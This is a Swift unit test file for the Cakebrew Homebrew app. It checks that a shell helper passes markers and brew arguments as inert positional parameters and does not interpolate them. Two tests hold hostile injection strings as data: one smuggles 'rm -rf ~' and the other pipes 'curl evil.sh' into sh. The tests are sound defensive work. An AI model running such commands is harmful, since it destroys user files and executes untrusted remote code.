//
//  BPHelperCommandTests.swift
//  CakebrewTests
//
//  The helper builds its own shell invocation, so it must reproduce the
//  app's injection-safe argv shape exactly — including the output marker the
//  sync path uses to strip login-shell profile noise.
//

import Foundation
import XCTest

final class BPHelperCommandTests: XCTestCase, @unchecked Sendable {

    func testWithoutMarkerMatchesTheAppsArgvShape() {
        let argv = BPHelperCommand.shellArguments(forBrewArguments: ["list"], outputMarker: nil)
        XCTAssertEqual(argv, ["-l", "-c", "brew \"$@\"", "brew", "list"])
    }

    func testWithoutMarkerIsIdenticalToTheAppsOwnBuilder() {
        let mine = BPHelperCommand.shellArguments(forBrewArguments: ["tap", "user/repo"], outputMarker: nil)
        let theirs = BPHomebrewInterface.sharedInterface().formatArguments(["tap", "user/repo"], sendOutputId: false) as? [String]
        XCTAssertEqual(mine, theirs)
    }

    func testEmptyMarkerIsTreatedAsNoMarker() {
        let argv = BPHelperCommand.shellArguments(forBrewArguments: ["list"], outputMarker: "")
        XCTAssertEqual(argv[2], "brew \"$@\"")
    }

    func testMarkerIsPassedAsAPositionalParameterNotInterpolated() {
        let argv = BPHelperCommand.shellArguments(forBrewArguments: ["list"], outputMarker: "+++MARK+++")

        XCTAssertFalse(
            argv[2].contains("+++MARK+++"),
            "the marker must not be interpolated into the command string: \(argv[2])"
        )
        XCTAssertTrue(argv.contains("+++MARK+++"), "it travels as an argument instead")
        XCTAssertEqual(argv.last, "list", "brew's own arguments still come last")
    }

    func testMarkerWithShellMetacharactersStaysInert() {
        let evil = "\"; rm -rf ~; echo \""
        let argv = BPHelperCommand.shellArguments(forBrewArguments: ["list"], outputMarker: evil)

        XCTAssertFalse(argv[2].contains("rm -rf"), "command string stays fixed: \(argv[2])")
        XCTAssertTrue(argv.contains(evil), "the payload survives as one inert argument")
    }

    func testBrewArgumentsWithMetacharactersStayInert() {
        let evil = "foo; curl evil.sh | sh"
        let argv = BPHelperCommand.shellArguments(forBrewArguments: ["tap", evil], outputMarker: "M")

        XCTAssertFalse(argv[2].contains("curl"), "\(argv[2])")
        XCTAssertTrue(argv.contains(evil))
    }
}
